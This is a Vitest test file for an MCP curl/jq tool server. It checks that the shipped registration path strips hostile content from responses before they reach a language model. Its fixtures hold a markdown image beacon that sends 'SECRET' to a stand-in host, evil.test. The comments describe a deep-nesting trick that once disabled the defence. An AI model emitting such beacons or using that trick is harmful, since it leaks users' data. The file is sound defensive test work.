// src/lib/tools/register-all-tools.test.ts
// Guards the SHIPPED BINARY's registration path — `src/index.ts` →
// `runStdio()`/`runHTTP()` → `registerAllCapabilities()` → `registerAllTools`.
//
// This path had no test at all, which is why `docs/todos/006` was possible:
// every wrap assertion in the tree ran against `McpCurlServer` or
// `tool-wrapper.ts` directly, so the whole suite stayed green while the one
// entry point `curl-mcp` exposes returned unwrapped output. A correct wrap that
// a registration path never calls is indistinguishable, from a unit test's
// point of view, from no wrap at all.
//
// The subprocess is the only thing mocked. Everything above it — the real
// executor, `processResponse`, `defendText`, the post-processor wrap — runs, so
// these assert the composition rather than any one stage's contract.

import { describe, it, expect, vi, beforeEach, afterEach, type Mock } from "vitest";
import { mkdtemp, writeFile, rm } from "node:fs/promises";
import { join } from "node:path";
import { CurlExecuteSchema, JqQuerySchema } from "../server/schemas.js";
import { DEFAULT_USER_AGENT } from "../config/index.js";
import { clearInjectionDetectionMap } from "../security/detection-logger.js";

// The real separator length, not a short stand-in: the metadata search window
// is sized from it, so a shorter mock hides margin the production path lacks.
const SEP = "\n---MCP-CURL-00000000-0000-4000-8000-000000000000---\n";

vi.mock("../types/index.js", async () => {
    const actual = await vi.importActual<typeof import("../types/index.js")>("../types/index.js");
    return { ...actual, generateMetadataSeparator: () => SEP };
});

vi.mock("../security/index.js", async () => {
    const actual = await vi.importActual<typeof import("../security/index.js")>("../security/index.js");
    return {
        ...actual,
        validateUrlAndResolveDns: vi.fn().mockResolvedValue({
            hostname: "api.example.test",
            resolvedIp: "93.184.216.34",
            port: 443,
        }),
        checkRateLimits: vi.fn(),
    };
});

vi.mock("../execution/index.js", async () => {
    const actual = await vi.importActual<typeof import("../execution/index.js")>("../execution/index.js");
    return { ...actual, executeCommand: vi.fn() };
});

const executionModule = await import("../execution/index.js");
const { registerAllCapabilities } = await import("../server/registration.js");

const mockedExecuteCommand = executionModule.executeCommand as Mock;

/** Build cURL output as the real executor hands it back. */
function curlOutput(body: string, contentType: string) {
    return {
        stdoutBytes: Buffer.concat([
            Buffer.from(body, "utf8"),
            Buffer.from(`${SEP}${contentType}`, "utf8"),
        ]),
        headerBytes: undefined,
        headerBytesReceived: undefined,
        stderr: "",
        exitCode: 0,
    };
}

/**
 * Register through the shipped chain and hand back the captured handlers.
 *
 * `registerAllCapabilities` rather than `registerAllTools`, because the claim
 * being guarded is about what `runStdio()` builds — and the extra hop is where
 * a future edit would most plausibly reintroduce a bare registration.
 */
function registerViaShippedPath() {
    const handlers = new Map<string, (...args: unknown[]) => Promise<unknown>>();
    const fakeServer = {
        registerTool: (
            name: string,
            _meta: unknown,
            handler: (...args: unknown[]) => Promise<unknown>
        ) => {
            handlers.set(name, handler);
        },
        registerResource: vi.fn(),
        registerPrompt: vi.fn(),
    };
    registerAllCapabilities(fakeServer as never);
    return handlers;
}

/** Parse through the real schema so tests exercise the true input shape. */
const params = (p: Record<string, unknown>) =>
    CurlExecuteSchema.parse({ url: "https://api.example.test/v1/thing", ...p });

/** Read a flag's value out of the argv the executor built. */
function flagValue(args: readonly string[], flag: string): string | undefined {
    const i = args.indexOf(flag);
    return i === -1 ? undefined : args[i + 1];
}

const textOf = (result: unknown) => (result as { content: { text: string }[] }).content[0].text;

beforeEach(() => {
    clearInjectionDetectionMap();
    vi.clearAllMocks();
});

// Teardown at describe scope, not in the test bodies. An in-body
// `vi.unstubAllEnvs()` never runs when an assertion above it throws, so one real
// failure leaks `MCP_CURL_USER_AGENT` into every test after it and turns a
// single fault into a cascade of misleading ones. Every other env-touching suite
// in this repo does it here — `config/defaults.test.ts`,
// `extensible/tool-wrapper.test.ts`.
afterEach(() => {
    vi.unstubAllEnvs();
});

describe("registerAllTools — the shipped binary's registration path", () => {
    it("registers both tools", () => {
        const handlers = registerViaShippedPath();
        expect([...handlers.keys()].sort()).toEqual(["curl_execute", "jq_query"]);
    });

    // ---------------------------------------------------------------------
    // Invariant 1: every byte returned to the LLM passes through the wrap.
    //
    // `application/json` is the content type that makes this falsifiable.
    // Under invariant 1a the PERSISTED copy keeps the JSON-document exemption
    // (RC-8/RC-10), so `defendText` leaves the beacon alone on the way to
    // disk. The wrap passes `excludeJsonDocuments: false`, so the RETURNED
    // copy must be stripped. Without the wrap the two copies are identical
    // and the beacon reaches the model verbatim — which is exactly what the
    // shipped binary did.
    // ---------------------------------------------------------------------
    it("strips a markdown beacon from an application/json body before returning it", async () => {
        mockedExecuteCommand.mockResolvedValue(
            curlOutput('{"note":"![x](https://evil.test/?d=SECRET)"}', "application/json")
        );

        const handlers = registerViaShippedPath();
        const text = textOf(await handlers.get("curl_execute")!(params({}), { sessionId: undefined }));

        expect(text).toContain("[image removed]");
        expect(text).not.toContain("evil.test");
        expect(text).not.toContain("SECRET");
    });

    // ---------------------------------------------------------------------
    // `README.md` documents MCP_CURL_USER_AGENT and MCP_CURL_REFERER as the
    // default "for every request". `applyDefaultHeaders` is their only reader
    // and it sits on the registration path, so before this fix the shipped
    // binary ignored both env vars entirely while the library honoured them.
    //
    // Asserted on the argv the executor actually built, not on the transform
    // in isolation: the transform was always correct: nothing called it.
    // ---------------------------------------------------------------------
    it("honours MCP_CURL_USER_AGENT on the shipped path", async () => {
        vi.stubEnv("MCP_CURL_USER_AGENT", "sixees-orchestrator/1.0");
        mockedExecuteCommand.mockResolvedValue(curlOutput("{}", "application/json"));

        const handlers = registerViaShippedPath();
        await handlers.get("curl_execute")!(params({}), { sessionId: undefined });

        const args = mockedExecuteCommand.mock.calls[0][1] as string[];
        expect(flagValue(args, "-A")).toBe("sixees-orchestrator/1.0");
    });

    it("identifies itself with the default User-Agent when no env override is set", async () => {
        vi.stubEnv("MCP_CURL_USER_AGENT", undefined);
        mockedExecuteCommand.mockResolvedValue(curlOutput("{}", "application/json"));

        const handlers = registerViaShippedPath();
        await handlers.get("curl_execute")!(params({}), { sessionId: undefined });

        const args = mockedExecuteCommand.mock.calls[0][1] as string[];
        expect(flagValue(args, "-A")).toBe(DEFAULT_USER_AGENT);
        expect(flagValue(args, "-A")).toContain("mcp-curl/");
    });

    // A caller-supplied user_agent still wins — the defaults fill a gap, they
    // do not override an explicit choice.
    it("does not override an explicit user_agent", async () => {
        vi.stubEnv("MCP_CURL_USER_AGENT", "sixees-orchestrator/1.0");
        mockedExecuteCommand.mockResolvedValue(curlOutput("{}", "application/json"));

        const handlers = registerViaShippedPath();
        await handlers.get("curl_execute")!(
            params({ user_agent: "explicit/9.9" }),
            { sessionId: undefined }
        );

        const args = mockedExecuteCommand.mock.calls[0][1] as string[];
        expect(flagValue(args, "-A")).toBe("explicit/9.9");
    });

    // ---------------------------------------------------------------------
    // The wrap must survive remote-chosen nesting depth.
    //
    // Measured before the depth bound existed: a 4,035-byte body overflowed
    // the stack inside `defendJsonLeaves`, `createWrapper`'s catch logged the
    // `RangeError` and returned the UNTOUCHED result still tagged as wrapped,
    // so the beacon reached the model and any downstream wrap short-circuited
    // too. A remote could switch the whole defence off with 4 KB.
    //
    // Depth is the axis, so the cases are a ladder rather than one payload:
    // a single depth exercises a single bound, and the two generations of
    // guard this file's own header describes both passed against the one
    // payload they carried.
    // ---------------------------------------------------------------------
    describe("depth cannot switch the defence off", () => {
        const nested = (depth: number) =>
            "[".repeat(depth) +
            JSON.stringify("![x](https://evil.test/?d=SECRET)") +
            "]".repeat(depth);

        for (const depth of [1, 50, 99, 100, 101, 500, 2000, 10000]) {
            it(`strips the beacon at nesting depth ${depth}`, async () => {
                mockedExecuteCommand.mockResolvedValue(
                    curlOutput(nested(depth), "application/json")
                );
                const handlers = registerViaShippedPath();
                const text = textOf(
                    await handlers.get("curl_execute")!(params({}), { sessionId: undefined })
                );

                expect(text).not.toContain("evil.test");
                expect(text).not.toContain("SECRET");
            });
        }
    });

    // ---------------------------------------------------------------------
    // Invariant 16 one nesting level down: the defence must not delete a
    // field. RC-16 closed this at the envelope; a string leaf that is itself
    // a serialised document is the next level, and it was open.
    //
    // The assertion is "are all the parts still there", not "does the result
    // parse" — RC-16's own closing lesson. A spliced document parses fine,
    // which is exactly why nothing downstream detected it.
    // ---------------------------------------------------------------------
    describe("the defence never deletes a field", () => {
        it("keeps every key when tokens pair across fields, under include_metadata", async () => {
            const body = '{"a":"open <!--","b":"secret","c":"close -->","d":"kept"}';
            mockedExecuteCommand.mockResolvedValue(curlOutput(body, "application/json"));

            const handlers = registerViaShippedPath();
            const text = textOf(
                await handlers.get("curl_execute")!(
                    params({ include_metadata: true }),
                    { sessionId: undefined }
                )
            );

            const returned = JSON.parse(JSON.parse(text).response);
            expect(Object.keys(returned)).toEqual(["a", "b", "c", "d"]);
        });

        it("keeps every key for a script pair split across fields", async () => {
            const body = '{"a":"<script>","b":"secret","c":"</script>","d":"kept"}';
            mockedExecuteCommand.mockResolvedValue(curlOutput(body, "application/json"));

            const handlers = registerViaShippedPath();
            const text = textOf(
                await handlers.get("curl_execute")!(
                    params({ include_metadata: true }),
                    { sessionId: undefined }
                )
            );

            const returned = JSON.parse(JSON.parse(text).response);
            expect(Object.keys(returned)).toEqual(["a", "b", "c", "d"]);
        });

        // Positive control for the composites-only rule in `defendJsonLeaves`.
        // `JSON_DOCUMENT_FIRST_CHARS` admits digits and `-`, so a scalar leaf
        // parses as JSON too — and recursing into one would re-serialise it,
        // turning the string "1.50" into "1.5" and "007" into "7". A scalar
        // has no fields and cannot be spliced, so this arm must leave it
        // exactly as the origin sent it.
        it("does not rewrite scalar-shaped string values", async () => {
            const body = '{"version":"1.50","id":"007","flag":"true","neg":"-0.0"}';
            mockedExecuteCommand.mockResolvedValue(curlOutput(body, "application/json"));

            const handlers = registerViaShippedPath();
            const text = textOf(
                await handlers.get("curl_execute")!(params({}), { sessionId: undefined })
            );

            expect(JSON.parse(text)).toEqual({
                version: "1.50",
                id: "007",
                flag: "true",
                neg: "-0.0",
            });
        });
    });

    // ---------------------------------------------------------------------
    // The mirror of the `curl_execute` wrap assertion above. Without this,
    // reverting the `registerJqToolWithHooks` call to a bare `registerTool`
    // passes the whole suite — which is the condition that let `docs/todos/006`
    // exist in the first place, recreated on the sibling tool by the guard
    // meant to close it. The assertion set must match the registration set.
    // ---------------------------------------------------------------------
    describe("jq_query takes the same wrap", () => {
        let dir: string;

        beforeEach(async () => {
            // Under cwd, which `validateFilePath` permits, so the real path
            // validation runs rather than being mocked away.
            dir = await mkdtemp(join(process.cwd(), ".tmp-register-all-tools-"));
        });

        afterEach(async () => {
            await rm(dir, { recursive: true, force: true });
        });

        it("strips a markdown beacon from a queried JSON file", async () => {
            const file = join(dir, "saved.json");
            await writeFile(file, '{"note":"![x](https://evil.test/?d=SECRET)"}', "utf-8");

            const handlers = registerViaShippedPath();
            const text = textOf(
                await handlers.get("jq_query")!(
                    JqQuerySchema.parse({ filepath: file, jq_filter: ".note" }),
                    { sessionId: undefined }
                )
            );

            expect(text).toContain("[image removed]");
            expect(text).not.toContain("evil.test");
            expect(text).not.toContain("SECRET");
        });
    });
});
